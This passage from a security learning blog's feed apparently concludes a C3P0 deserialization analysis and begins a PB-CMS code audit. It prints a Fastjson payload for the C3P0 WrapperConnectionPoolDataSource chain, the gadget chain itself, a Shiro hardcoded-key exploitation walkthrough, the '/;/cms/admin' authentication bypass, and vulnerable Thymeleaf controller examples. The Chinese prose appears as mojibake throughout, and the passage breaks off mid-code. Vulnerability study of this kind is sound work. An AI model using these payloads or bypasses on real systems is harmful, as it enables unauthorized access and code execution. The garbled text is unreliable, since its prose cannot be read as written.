alt="image-20240411192203687"><br>ÂèØ‰ª•ÁúãÂà∞Ê≠§Êó∂Êàë‰ª¨ÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆÂπ∂Ê≤°Êúâ‰º†ËøõÊù•ÔºåÁÑ∂ÂêéÂêéÈù¢‰ºöË∞ÉÁî®Âà∞‰∏ãÈù¢Ëøô‰∏™ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111922651.png" alt="image-20240411192211483"><br>Ëøô‰∏™ÊñπÊ≥ïÁöÑÂèÇÊï∞Â∞±ÊòØÊàë‰ª¨ÁöÑÊÅ∂ÊÑèÂ∫èÂàóÂåñÊï∞ÊçÆÔºåËøôÈáå‰ºöÂà§Êñ≠<code>oldVal</code>Âíå<code>userOverridesAsString</code>ÊòØÂê¶Áõ∏Á≠âÊàñËÄÖÈÉΩ‰∏∫Á©∫ÔºåÂê¶ÂàôÁöÑÂåñÂ∞±‰ºöÂ∞ÜÊàë‰ª¨‰º†ÂÖ•ÁöÑÊÅ∂ÊÑèÂ∫èÂàóÂåñÊï∞ÊçÆËµãÂÄºÁªô<code>userOverridesAsString</code>Ôºå‰ΩÜÊòØÂΩìÊàëËµ∞Âà∞ÊúÄÂêé‰∏ÄÂè•ÁöÑÊó∂ÂÄôËÆ°ÁÆóÊú∫Â∞±ÂºπÂá∫Êù•‰∫ÜÔºåÊâÄ‰ª•ËÇØÂÆöÂ∞±‰∏çÊòØÂú®Êàë‰ª¨ÂéüÂÖàÂàÜÊûêÁöÑÈÇ£ÈáåËß¶ÂèëÁöÑÔºåÊàë‰ª¨Ë∑üËøõ<code>fireVetoableChange</code>ÊñπÊ≥ïÔºå‰ºöÊù•Âà∞<code>vetoableChange</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111922473.png" alt="image-20240411192220314"><br>‰∏ãÈù¢Âç≥ÊòØ<code>parseUserOverridesAsString</code>ÊñπÊ≥ïÂíå‰∏äÈù¢ÁöÑÂ∞±ÊòØ‰∏ÄÊ†∑ÁöÑ‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111922873.png" alt="image-20240411192228566"><br>ËøôÈáåÁöÑvarÂç≥Êàë‰ª¨ÊÅ∂ÊÑèÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆÔºåÊâÄ‰ª•ÂÖ∂ÂÆûËøôÈáåÊòØÂú®<code>setUserOverridesAsString</code>ÊñπÊ≥ï‰∏ãÂ∞ÜÊàë‰ª¨ÊÅ∂ÊÑèÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆËµãÂÄºÁªôvarËß¶Âèë‰∫åÊ¨°ÂèçÂ∫èÂàóÂåñÁöÑ<br>ÊâÄ‰ª•ÂÖ∂ÂÆû‰∏ãÈù¢Ëøô‰∏™payload‰πüÊòØÂèØ‰ª•ÁöÑ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String payload = &quot;&#123;&quot; +</span><br><span class="line">        &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +</span><br><span class="line">        &quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\&quot;,&quot; +</span><br><span class="line">        &quot;&#125;&quot;;</span><br></pre></td></tr></table></figure><p>ÂèçËÄåËøôÈáåÁöÑÁ¨¨‰∏Ä‰∏™payloadÊ≤°Â§™ÁêÜËß£ÔºåÈÇ£ÈáåË∞ÉËØï‰πüÊòØËµ∞ÁöÑ<code>setUserOverridesAsString</code>ÔºåÂÖà‰∏çÁÆ°‰∫ÜÔºåÂõ†‰∏∫ÊúÄÂêéÊòØÁî±readObjectËß£ÊûêÂ∫èÂàóÂåñÊï∞ÊçÆÔºåÊâÄ‰ª•ËøôÈáåÂêåÊ†∑ÂèØ‰ª•Âà©Áî®overlongencoding<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111922707.png" alt="image-20240411192239440"><br>ÂèØ‰ª•ÁúãÂà∞Âè™ÈúÄË¶ÅÁî®JavaAgent hook‰∏Ä‰∏ãÂç≥ÂèØ‰ª£Á†ÅÈÉΩ‰∏çÁî®ÊîπÔºå‰∏ãÈù¢ËøôÊòØÂéüÊú¨ÁöÑÊ†∑Â≠ê<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111922401.png" alt="image-20240411192248247"></p><h3 id="Âà©Áî®Èìæ-2"><a href="#Âà©Áî®Èìæ-2" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#ËÆæÁΩÆuserOverridesAsStringÂ±ûÊÄßÂÄº</span><br><span class="line">WrapperConnectionPoolDataSource#setuserOverridesAsString -&gt;</span><br><span class="line">WrapperConnectionPoolDataSourceBase#setUserOverridesAsString</span><br><span class="line"> </span><br><span class="line">#ÂàùÂßãÂåñÁ±ªÊó∂ÂèçÂ∫èÂàóÂåñÂçÅÂÖ≠ËøõÂà∂Â≠óËäÇÊµÅ</span><br><span class="line">WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource -&gt;</span><br><span class="line">C3P0ImplUtils#parseUserOverridesAsString -&gt;</span><br><span class="line">SerializableUtils#fromByteArray -&gt;</span><br><span class="line">SerializableUtils#deserializeFromByteArray -&gt;</span><br><span class="line">ObjectInputStream#readObject</span><br></pre></td></tr></table></figure><h2 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h2><p>‰∏≠Èó¥ËøòÊòØÊúâÂæàÂ§öËø∑ÊÉëÁÇπÁöÑÔºå‰ΩÜÊòØÂ∞±ÂÖàËøôÊ†∑ÂêßÔºåÊÑüËßâÁî®CodeQLÊâæÂ∫îËØ•‰ºöÊúâ‰∏ç‰∏ÄÊ†∑ÁöÑÊÑüËßâÂêßÔºåÁ≠âÂ≠¶‰ºö‰∫ÜÊÄé‰πàÂÜôÊü•ËØ¢ÂÜçÊù•ÁúãÁúã</p><h2 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h2><p><a href="https://blog.csdn.net/uuzeray/article/details/136551969">„ÄêWeb„ÄëÊµÖËÅäJavaÂèçÂ∫èÂàóÂåñ‰πãC3P0‚Äî‚ÄîURLClassLoaderÂà©Áî®-CSDNÂçöÂÆ¢</a><br><a href="https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE">https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE</a><br><a href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a><br><a href="https://xz.aliyun.com/t/12286">https://xz.aliyun.com/t/12286</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PB-CMS‰ª£Á†ÅÂÆ°ËÆ°Â≠¶‰π†</title>
      <link href="/2024/03/PB-CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/PB-CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h2><p>Â•Ω‰πÖÊ≤°Êõ¥Êñ∞ÂçöÂÆ¢‰∫ÜÔºåÊÑüËßâÂ≠¶Âà∞ÂêéÈù¢‰∏çÊáÇÁöÑ‰∏úË•øÊõ¥Â§öÔºåÈÄöÂ∏∏Â≠¶‰∏Ä‰∏™‰∏úË•ø‰∏∫‰∫ÜÁêÜËß£ÂÆÉÂ∞±Ë¶ÅÂ≠¶Êõ¥Â§öÁöÑ‰∏úË•øÔºåÊâÄ‰ª•Ë∂äÊù•Ë∂ä‰∏çÊÉ≥Êõ¥Êñ∞ÂçöÂÆ¢‰∫Ü„ÄÇ„ÄÇ„ÄÇ</p><h2 id="ÁéØÂ¢É"><a href="#ÁéØÂ¢É" class="headerlink" title="ÁéØÂ¢É"></a>ÁéØÂ¢É</h2><p>È°πÁõÆÂú∞ÂùÄÔºö<a href="https://gitee.com/LinZhaoguan/pb-cms/tree/v1.0.0/">https://gitee.com/LinZhaoguan/pb-cms/tree/v1.0.0/</a></p><h2 id="shiroÂèçÂ∫èÂàóÂåñÊºèÊ¥û"><a href="#shiroÂèçÂ∫èÂàóÂåñÊºèÊ¥û" class="headerlink" title="shiroÂèçÂ∫èÂàóÂåñÊºèÊ¥û"></a>shiroÂèçÂ∫èÂàóÂåñÊºèÊ¥û</h2><p>Áõ¥Êé•Êù•Áúãpom.xmlÊñá‰ª∂ÔºåÊêúÂà∞shiro<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191318901.png" alt="image-20240319131808830"><br>1.4.1ÁâàÊú¨ÔºåÈááÁî®ÁöÑÂä†ÂØÜÊ®°ÂºèËøòÊòØAES-CBCÔºå‰ªé1.4.2ÁâàÊú¨ÂºÄÂßãÈááÁî®ÁöÑÊòØAES-GCM<br>ÊâÄ‰ª•Áõ¥Êé•ÊãøÂ∑•ÂÖ∑‰∏ÄÊääÊ¢≠Âç≥ÂèØ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191318340.png" alt="image-20240319131819286"><br>ÁÑ∂ÂêéÂëΩ‰ª§ÊâßË°å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191318307.png" alt="image-20240319131830242"><br>Âú®ËøôÈáå1.4.1ÁâàÊú¨ÂÖ∂ÂÆûshiro550‰∏çËÉΩÊâìÔºåÊâìshiro550ÁâàÊú¨Ë¶ÅÂ∞è‰∫é1.2.4„ÄÇ‰ΩÜÊòØÂú®shiroÂèçÂ∫èÂàóÂåñÊºèÊ¥û‰øÆÂ§çÁöÑÊó∂ÂÄôÂ¶ÇÊûú‰ªÖÂØπshiroÁâàÊú¨ÂçáÁ∫ßËÄåÊ≤°ÊúâÈáçÊñ∞ÁîüÊàêÂØÜÈí•ÈÇ£‰πàAESÂä†ÂØÜÁöÑÈªòËÆ§ÂØÜÈí•Á°¨ÁºñÁ†Å‰ªçÁÑ∂‰ºöÂú®‰ª£Á†ÅÈáåÈù¢ÔºåÂ∞±‰ºöÂêåÊ†∑Â≠òÂú®ÂèçÂ∫èÂàóÂåñÈ£éÈô©ÔºåËøôÈáåÂéªÁúãÁúãÊòØÂê¶Â≠òÂú®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191318699.png" alt="image-20240319131842491"><br>Á°ÆÂÆûÂ≠òÂú®Ôºå‰ΩçÁΩÆÂú®<code>src/main/java/com/puboot/common/config/ShiroConfig.java</code><br>Êêú‰∫Ü‰∏Ä‰∏ãËøôÈáåÊÄé‰πàÁîüÊàê‰∏Ä‰∏™Êñ∞ÁöÑshirokeyÔºåÂèØ‰ª•Âà©Áî®ÂÆòÊñπÊèê‰æõÁöÑÊñπÊ≥ïÁîüÊàê‰∏Ä‰∏™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.crypto.KeyGenerator;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">KeyGenerator</span> <span class="variable">keygen</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            keygen = KeyGenerator.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">SecretKey</span> <span class="variable">deskey</span> <span class="operator">=</span> keygen.generateKey();</span><br><span class="line">        System.out.println(Base64.encodeToString(deskey.getEncoded()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191318913.png" alt="image-20240319131852883"><br>ÊØèÊ¨°ËøêË°åÈÉΩ‰ºöÂæóÂà∞‰∏ç‰∏ÄÊ†∑ÁöÑkeyÔºåÁÑ∂ÂêéÊàë‰ª¨ÊõøÊç¢‰∏Ä‰∏ãkeyÁúãËøòËÉΩ‰∏çËÉΩÁàÜÁ†¥Âá∫Êù•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319040.png" alt="image-20240319131900990"><br>ÂèØ‰ª•ÁúãÂà∞ÁàÜÁ†¥Âà∞Â§©ËçíÂú∞ËÄÅ‰πüÊ≤°Ê≥ïÁàÜÂá∫Êù•Èô§ÈùûÂàöÂ•ΩÂ≠óÂÖ∏ÈáåÈù¢ÊúâËøô‰∏™keyÔºåÊâÄ‰ª•‰øÆÂ§çÁî®ËøôÁßçÊñπÂºèÂç≥ÂèØÔºåÊØîÂ¶ÇÊàëÊääÂàöÂàöÈÇ£‰∏™ÂØÜÈí•Âä†Âà∞Â≠óÂÖ∏ÈáåÈù¢ÂèØ‰ª•ÁúãÂà∞Â∞±ËÉΩÁàÜÂá∫Êù•‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319198.png" alt="image-20240319131913155"></p><h2 id="shiroÊùÉÈôêÁªïËøá"><a href="#shiroÊùÉÈôêÁªïËøá" class="headerlink" title="shiroÊùÉÈôêÁªïËøá"></a>shiroÊùÉÈôêÁªïËøá</h2><p>Shiro 1.5.3ÁâàÊú¨‰πãÂâçÔºåÂΩìshiroÂíåspringboot‰∏ÄËµ∑‰ΩøÁî®Êó∂ÂèØËÉΩ‰ºöÂØºËá¥Ë∫´‰ªΩÈ™åËØÅÁªïËøá<br>ÊºèÊ¥ûÁöÑ‰∏ªË¶ÅÂéüÂõ†Â∞±ÊòØshiroÂíåspringÂØπË∑ØÂæÑÁöÑËß£ÊûêÊúâÂ∑ÆÂºÇÔºå‰∏ãÈù¢ÂºÄÂßãÂ§çÁé∞<br>Êàë‰ª¨Áõ¥Êé•ËÆøÈóÆ<code>/cms/admin</code>Êó∂‰ºöË∑≥ËΩ¨Âà∞ÁôªÂΩïÁïåÈù¢Ôºå‰ΩÜÊòØÂΩì‰ΩøÁî®<code>/;/cms/admin</code>Êó∂Âç≥ÂèØË∑≥ËøáËÆ§ËØÅ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319879.png" alt="image-20240319131920791"><br>Ëøô‰∏™ËôΩÁÑ∂ÁªïËøá‰∫Ü‰ΩÜÊòØÊ≤°Âï•ÊùÉÈôê‰ªÄ‰πàÈÉΩÂπ≤‰∏ç‰∫Ü</p><h3 id="‰ª£Á†ÅÂàÜÊûê"><a href="#‰ª£Á†ÅÂàÜÊûê" class="headerlink" title="‰ª£Á†ÅÂàÜÊûê"></a>‰ª£Á†ÅÂàÜÊûê</h3><p>Ëøô‰∏™Ê¥û‰πãÂâçÊ≤°Á¢∞ËøáË∑üÁùÄÁúã‰∏ã‰ª£Á†Å<br><strong>shiro</strong><br>Êñ≠ÁÇπ‰∏ãÂú®<code>org/apache/shiro/web/filter/mgt/PathMatchingFilterChainResolver.java#getChain</code>ËøôÈáåÔºåÁÑ∂ÂêéÂºÄÂßãË∞ÉËØï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319368.png" alt="image-20240319131933115"><br>ÂèØ‰ª•ÁúãÂà∞ËøôÈáåÈÄöËøá<code>getPathWithinApplication()</code>ÊñπÊ≥ïËé∑ÂèñÂà∞ÁöÑ<code>requestURI</code>Âè™Êúâ‰∏Ä‰∏™<code>/</code>Ë∑üËøõÂéªÂàÜÊûê‰∏Ä‰∏ãÔºåÊù•Âà∞<code>getPathWithinApplication()</code>ÊñπÊ≥ï‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319335.png" alt="image-20240319131941180"><br>ÂèØ‰ª•ÁúãÂà∞ËøôÈáåË∞ÉÁî®‰∫Ü<code>getRequestUri()</code>ÊñπÊ≥ïÂêé<code>requestUri</code>Â∞±Â∑≤ÁªèÂèòÊàê‰∫Ü<code>/</code>ÊúÄÂêé‰πüÂ∞±ÊòØËøîÂõûÁöÑËøô‰∏™ÔºåÈÇ£‰πàÁªßÁª≠Ë∑üËøõ<code>getRequestUri()</code>ÊñπÊ≥ïÁúãÁúã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319867.png" alt="image-20240319131956696"><br>‰ªéËøôÈáåÁöÑËã±ÊñáÊ≥®Èáä‰∏≠ÂèØ‰ª•ÁúãÂà∞Ëøô‰∏™ÂáΩÊï∞ÁöÑÂäüËÉΩÂ∞±ÊòØÊà™ÂèñÂàÜÂè∑‰πãÂâçÁöÑ‰∏úË•øÔºå‰ΩÜÊòØËøòÊòØÁúã‰∏Ä‰∏ãÂÖ∑‰ΩìÁöÑÂ§ÑÁêÜÈÄªËæëÔºåË∑üËøõ<code>decodeAndCleanUriString()</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191320163.png" alt="image-20240319132012022"><br>ËøôÈáåÂèØ‰ª•ÁúãÂà∞<code>uri.indexOf(&#39;;&#39;)</code>‰ºöËé∑ÂèñÂà∞ÂàÜÂè∑ÁöÑ‰ΩçÁΩÆÁÑ∂ÂêéËµãÂÄºÁªô<code>semicolonIndex</code>ÊúÄÂêéÊà™Âèñ0Âà∞ÂàÜÂè∑ÁöÑ‰ΩçÁΩÆÁöÑ‰∏úË•øËøîÂõûÔºåÁÑ∂ÂêéÁªßÁª≠ÂæÄ‰∏ãÔºå‰ºöÊãøÁùÄ<code>pathPattern</code>ÂéªÂåπÈÖçÈâ¥ÊùÉËßÑÂàô<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191320599.png" alt="image-20240319132021465"><br>ÁÑ∂ÂêéÂåπÈÖç‰∏ç‰∏äËøîÂõûnull<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191320713.png" alt="image-20240319132028565"><br>Âõ†‰∏∫‰∏äÈù¢ËøôÈáåËøîÂõûnullÔºåÂâçÈù¢ÂåπÈÖç‰∏ç‰∏äË∑ØÂæÑÂØπÂ∫îÁöÑÈâ¥ÊùÉÊ®°ÂºèÔºåÊâÄ‰ª•‰∏ç‰ºöËÆæÁΩÆÂåπÈÖçÂà∞ÁöÑÈâ¥ÊùÉÂØπ‰∫éÁöÑFIlter„ÄÇË∑üÁùÄË∞ÉÁî®<code>chain.doFilter</code>,‰ªéËÄåÂÆûÁé∞ÁªïËøá<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191320571.png" alt="image-20240319132049315"><br>ËøôÈáåËµ∞ÂÆå‰πãÂêéÂ∞±‰ºöÂéªÂà∞springÁöÑurlÂ§ÑÁêÜ<br><strong>spring</strong><br>Êñ≠ÁÇπ‰∏ãÂú®<code>org.springframework.web.util.UrlPathHelper.java#getPathWithinServletMapping</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191321074.png" alt="image-20240319132059770"><br>ÁÑ∂ÂêéË∞ÉËØï‰∏Ä‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191321312.png" alt="image-20240319132113027"><br>ËøôÈáåÂèØ‰ª•ÁúãÂà∞<code>getPathWithinApplication()</code>Â§ÑÁêÜ‰πãÂêé<code>pathWithinApp</code>Â∞±Â∑≤ÁªèÂèò‰∏∫‰∫Ü<code>/cms/admin</code>‰∫ÜÊâÄ‰ª•Ë∑üËøõ‰∏äÈù¢ÈÇ£‰∏™ÂáΩÊï∞ÁúãÁúã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191321605.png" alt="image-20240319132125424"><br>Âà∞ËøôÈáå‰ºº‰πéÂíåshiroÊòØ‰∏ÄÊ†∑ÁöÑÂáΩÊï∞ÔºåÊâÄ‰ª•Áõ¥Êé•Ë∑üËøõÂéªÁúãÁúã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191321898.png" alt="image-20240319132144687"><br>Êù•Âà∞ËøôÈáåÁªßÁª≠Ë∑üËøõ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191321827.png" alt="image-20240319132156670"><br>ËøôÈáå‰∏âÊ≠•ÂèØ‰ª•ÁúãÂà∞ÂÖàËøáÊª§‰∫ÜÂàÜÂè∑ÁÑ∂ÂêéËøáÊª§‰∫ÜÈáçÂ§çÁöÑ<code>/</code>ÂæóÂà∞<code>/cms/admin</code>ÔºåspringËÉΩÊ≠£Â∏∏Â§ÑÁêÜËøô‰∏™urlÊâÄ‰ª•ÂÆûÁé∞‰∫ÜÁªïËøáÔºåÂ¶ÇÊûúÊ≤°ÊúâÂä†ÂàÜÂè∑ËøôÈáåÂæóÂà∞ÁöÑÂ∞±ÊòØlogin<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191322841.png" alt="image-20240319132215600"><br>ËøôÈáåÁúã‰∫ÜÂæàÂ§öÂàÜÊûêÊñáÁ´†ÔºåÊúÄÁªàÁöÑÊÄªÁªìÂ∞±ÊòØurlËøõÂÖ•tomcatÂêétomcatÂà§Êñ≠<code>/;/cms/admin</code>cms‰∏ãÁöÑadminÔºåËøõÂÖ•Âà∞shiroÊó∂<code>;</code>ÂêéÈù¢Ë¢´Êà™Êñ≠Âèò‰∏∫<code>/</code>ÔºåÁªïËøáÈâ¥ÊùÉÔºåÊ≠§Êó∂ÂÜçËøõÂÖ•springÊó∂ÂèàË¢´ÁêÜËß£‰∏∫<code>/cms/admin</code>ÊúÄÁªàÂØºËá¥shiroÊùÉÈôêÁöÑÁªïËøáÔºåËøôÂùóÁúã‰∫ÜÂæàÂ§öÊñáÁ´†Âè™ËÉΩÂãâÂº∫ÁêÜËß£Âà∞ËøôÈáå‰∫ÜÔºåÂÜçÊ∑±ÂÖ•ÊÑüËßâÂæóÂéªÁúãshiroÁöÑÈâ¥ÊùÉËßÑÂàô</p><h2 id="SSRFÁªìÂêàFastjson"><a href="#SSRFÁªìÂêàFastjson" class="headerlink" title="SSRFÁªìÂêàFastjson"></a>SSRFÁªìÂêàFastjson</h2><p>Êñ∞Áü•ËØÜÁÇπÔºåÂ≠¶‰π†‰∏Ä‰∏ã<br>ÁôªÂΩïÂêéÂè∞ÂèëÁé∞Êú¨Êù•ÁöÑÂäüËÉΩÊòØËøôÊ†∑ÁöÑ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191322640.png" alt="image-20240319132227586"><br>ÁÑ∂ÂêéÊù•Âà∞Êï∞ÊçÆÂ∫ì‰∏≠<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191322952.png" alt="image-20240319132239913"><br>ÂèëÁé∞ËøôÈáåÂ§ö‰∫Ü‰∏™ÁÇπÔºå‰∏çÁü•ÈÅìÊòØ‰ΩúËÄÖÊúâÊÑèËøôÊ†∑ÂÜôÁöÑËøòÊòØÊÄé‰πàÔºåÂΩìÂéªÊéâËøô‰∏™ÁÇπÂêé‰ºöÂèëÁé∞‰∏äÈù¢ÈÇ£‰∏™ÊñáÁ´†ÂàóË°®Â§ö‰∫Ü‰∏Ä‰∏™ÂäüËÉΩÔºüËá™Â∑±ÂéªÂºÑ‰∫Ü‰∏ãÂèëÁé∞Âπ∂Ê≤°ÊúâÂïäÔºåÊòØÊàëÊìç‰ΩúÊúâÈóÆÈ¢òÔºü‰∏çÁü•ÈÅìËøô‰∏™wsyu9aÂ∏àÂÇÖÊÄé‰πàÂºÑÁöÑÔºåÊú¨Êù•ÊÉ≥ÊâãÂä®Â≠¶‰π†‰∏Ä‰∏ãÁöÑÔºåÊó†Â•àÂè™ËÉΩÁúãÁúã‰∫Ü</p><h2 id="ThymeleafÊ®°ÊùøÊ≥®ÂÖ•ÊºèÊ¥û"><a href="#ThymeleafÊ®°ÊùøÊ≥®ÂÖ•ÊºèÊ¥û" class="headerlink" title="ThymeleafÊ®°ÊùøÊ≥®ÂÖ•ÊºèÊ¥û"></a>ThymeleafÊ®°ÊùøÊ≥®ÂÖ•ÊºèÊ¥û</h2><p>ThymeleafÁöÑÊ®°ÊùøÊ≥®ÂÖ•‰πãÂâçÊ≤°Êé•Ëß¶ËøáÔºå‰ΩÜÊòØÂ∫îËØ•ÂíåÂÖ∂ÂÆÉÁöÑÊ®°ÊùøÊ≥®ÂÖ•Â∑Æ‰∏çÂ§öÔºåËøô‰∏™Ê¥ûÂ∑≤ÁªèË¢´Êèê‰∫Üissues<br><a href="https://gitee.com/LinZhaoguan/pb-cms/issues/I51W2D">pb-cmsÂ≠òÂú®ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ¬∑ Issue #I51W2D ¬∑ LinZhaoguan&#x2F;pb-cms - Gitee.com</a><br>ËøôÈáåÂÖàÁúãÁúãÂºïËµ∑ÊºèÊ¥ûÁöÑÊÉÖÂÜµ<br><strong>Á¨¨‰∏ÄÁßç</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/path&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">path</span><span class="params">(<span class="meta">@RequestParam</span> String lang)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span>  lang ; <span class="comment">//template path is tainted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Â¶Ç‰∏äÔºåÊ®°ÊùøÁöÑË∑ØÂæÑÂèØÊéßÔºåËøôÈáåÂ¶ÇÊûúËæìÂÖ•ÁöÑÊòØ<code>/path?lang=en</code>Â∞±‰ºöÂéªÂØªÊâæen.htmlËøô‰∏™Ê®°ÊùøÔºåÊâæÂà∞Â∞±ÊòæÁ§∫ÔºåÊ≤°ÊâæÂà∞Â∞±Êä•ÈîôÔºå‰ΩÜÊòØÂ¶ÇÊûúÊàë‰ª¨ËæìÂÖ•ÁöÑÊòØspelË°®ËææÂºèÂ∞±‰ºöË¢´Ëß£ÊûêÊâßË°åÔºåÊâÄ‰ª•Ëøô‰∏™ÊºèÊ¥ûÁöÑÊú¨Ë¥®ËøòÊòØspelË°®ËææÂºèÊ≥®ÂÖ•ÔºåÂíåsstiËøòÊòØ‰∏ç‰∏ÄÊ†∑<br><strong>Á¨¨‰∫åÁßç</strong><br>controllerÊó†ËøîÂõûÂÄºÔºåÂàô‰ª•GetMappingÁöÑË∑ØÁî±‰∏∫ËßÜÂõæÂêçÁß∞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getDocument</span><span class="params">(<span class="meta">@PathVariable</span> String document)</span> &#123;  </span><br><span class="line">    log.info(<span class="string">&quot;Retrieving &quot;</span> + document);  </span><br><span 